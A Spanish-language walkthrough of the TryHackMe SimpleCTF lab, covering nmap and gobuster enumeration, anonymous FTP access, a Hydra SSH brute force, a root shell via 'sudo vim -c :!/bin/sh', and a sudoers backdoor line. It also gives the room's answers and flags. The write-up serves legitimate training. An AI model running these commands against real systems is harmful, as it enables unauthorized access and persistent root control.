# 🧩 SimpleCTF – TryHackMe
**Fecha:** 18 de Noviembre, 2025  
**Plataforma:** TryHackMe  
**Autor:** rSamCod  
**Resumen:**  
Enumeración, explotación y escalación de privilegios con permisos sudo vim y edición de sudoers.

---

## Reconocimiento inicial

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.226.230 -oG allPorts
```

**Parámetros:**
- **-p-** → Escanea todos los puertos (1–65535).  
- **-sS** → SYN Scan (rápido y silencioso).  
- **--open** → Muestra solo puertos abiertos.  
- **--min-rate 5000** → Envía mínimo 5000 paquetes por segundo (scan rápido).  
- **-vvv** → Modo verboso al máximo.  
- **-n** → No hacer resolución DNS.  
- **-Pn** → Asume que el host está activo (omite ping).  
- **-oG allPorts** → Guarda salida en formato grepable.

<img width="1894" height="752" alt="Captura de pantalla 2025-11-18 163245" src="https://github.com/user-attachments/assets/3ab8997f-817e-4709-855b-9f33d9cc412b" />


**Resultado:**  
Puertos identificados → **21 (FTP), 80 (HTTP), 2222 (SSH)**

---

### Question 1  
**How many services are running under port 1000?**  
**Answer:** 2

---

## Escaneo enfocado

```bash
nmap -p21,80,2222 -sV -sC 10.10.226.230 -oN targeted
```

**Parámetros:**
- **-sV** → Detecta versiones.  
- **-sC** → Ejecuta scripts NSE por defecto.  
- **-oN targeted** → Guarda salida en texto normal.

**Hallazgos:**  
- FTP permite **Anonymous Login**  
- SSH está escuchando en **2222**

<img width="1899" height="843" alt="Captura de pantalla 2025-11-18 163828" src="https://github.com/user-attachments/assets/183dc3d8-f4fb-4d01-82b1-3e67294a1a84" />


---

### Question 2  
**What is running on the higher port?**  
**Answer:** ssh

---

## Fuzzing de directorios

```bash
gobuster dir -u 10.10.226.230 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Parámetros:**
- **dir** → Modo de descubrimiento de directorios.  
- **-u** → URL objetivo.  
- **-w** → Wordlist.

<img width="1902" height="850" alt="Captura de pantalla 2025-11-18 165025" src="https://github.com/user-attachments/assets/4c2c3660-af5b-41f5-8447-eddc62b455e9" />


Se descubre:  
**http://10.10.226.230/simple/** → Página de **CMS Made Simple**

---

Buscamos vulnerabilidades conocidas:

<img width="1892" height="748" alt="Captura de pantalla 2025-11-18 165641" src="https://github.com/user-attachments/assets/abcaa4f4-1321-411e-9bea-3d77650a4800" />


**Resultado:** Vulnerable a **CVE-2019-9053 (SQLi)**

---

### Question 3  
**What's the CVE you're using against the application?**  
**Answer:** CVE-2019-9053

### Question 4  
**To what kind of vulnerability is the application vulnerable?**  
**Answer:** sqli

---

## Acceso por FTP Anonymous

```bash
ftp 10.10.226.230
```

Ingresamos con el usuario:  
**Anonymous**

Dentro encontramos:

<img width="1900" height="468" alt="Captura de pantalla 2025-11-18 165418" src="https://github.com/user-attachments/assets/01a13460-6578-4cd6-ae52-5ac94d6f3c2c" />


```bash
less ForMitch.txt
```

<img width="1898" height="224" alt="Captura de pantalla 2025-11-18 165324" src="https://github.com/user-attachments/assets/eddecd3d-58be-40c5-b2db-8dd3b2e228a8" />


El archivo menciona que **mitch tiene una contraseña débil**, lo que sugiere ataque de fuerza bruta por SSH.

---

## Fuerza bruta con Hydra

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.226.230:2222
```

**Parámetros:**
- **-l** → Usuario objetivo.  
- **-P** → Wordlist de contraseñas.  
- **ssh://IP:PORT** → Servicio a atacar.

<img width="1898" height="375" alt="Captura de pantalla 2025-11-18 170157" src="https://github.com/user-attachments/assets/c4ee9a39-74ff-46b6-b66c-80fbfd1444a8" />


**Resultado:**  
Contraseña encontrada → **secret**

---

### Question 5  
**What's the password?**  
**Answer:** secret

---

## Conexión SSH

```bash
ssh -p2222 mitch@10.10.226.230
```

**Parámetros:**
- **-p2222** → Especifica el puerto SSH.

---

### Question 6  
**Where can you login with the details obtained?**  
**Answer:** ssh

---

Dentro encontramos **user.txt**

```bash
cat user.txt
```

<img width="1897" height="731" alt="Captura de pantalla 2025-11-18 170541" src="https://github.com/user-attachments/assets/e89a2698-b48d-496a-9558-91ebd109affc" />


### Question 7  
**What's the user flag?**  
**Answer:** G00d j0b, keep up!

---

## Enumeración de usuarios

Se identifica un nuevo usuario:

<img width="1895" height="863" alt="Captura de pantalla 2025-11-18 170644" src="https://github.com/user-attachments/assets/0c5311b8-e5d5-439e-beb0-ea4bb8967c67" />


### Question 8  
**Is there any other user in the home directory? What's its name?**  
**Answer:** sunbath

---

## Escalada de privilegios mediante Vim

```bash
sudo -l
```

<img width="1117" height="58" alt="Captura de pantalla 2025-11-18 183519" src="https://github.com/user-attachments/assets/53102e61-8cc3-407f-90aa-cca648dc8185" />


Resultado:  
`vim` puede ejecutarse como sudo → vulnerable según **GTFOBins**.

<img width="1900" height="764" alt="Captura de pantalla 2025-11-18 170853" src="https://github.com/user-attachments/assets/3eddfe38-f45d-4f33-84e6-be1aa311f6e1" />


Explotación:

```bash
sudo vim -c ':!/bin/sh'
```

Accedemos como root.

Luego editamos sudoers:

```bash
vi /etc/sudoers
```

<img width="1901" height="850" alt="Captura de pantalla 2025-11-18 172658" src="https://github.com/user-attachments/assets/6ac173c5-8a8d-4a47-bbbd-8675d55c891c" />


Añadimos:
```
ALL ALL=(ALL) NOPASSWD: ALL
```

Ahora podemos obtener root:

```bash
sudo su
```

<img width="1898" height="850" alt="Captura de pantalla 2025-11-18 173300" src="https://github.com/user-attachments/assets/737ec08c-558c-4613-a280-fd7d305e815f" />


---

### Question 9  
**What can you leverage to spawn a privileged shell?**  
**Answer:** vim

---

### Question 10  
**What's the root flag?**  
**Answer:** W3ll d0n3. You made it!

---

## Lecciones aprendidas

- La enumeración inicial con Nmap entrega el mapa completo del sistema.  
- El FTP Anonymous sigue siendo una puerta peligrosa en entornos mal configurados.  
- CMS Made Simple tiene exploits conocidos, siempre revisar CVEs.  
- Hydra es útil para ataques dirigidos cuando se tiene un usuario identificado.  
- GTFOBins es clave para escalar privilegios mediante comandos con sudo.  
- La validación de permisos y la correcta protección de sudoers es esencial.

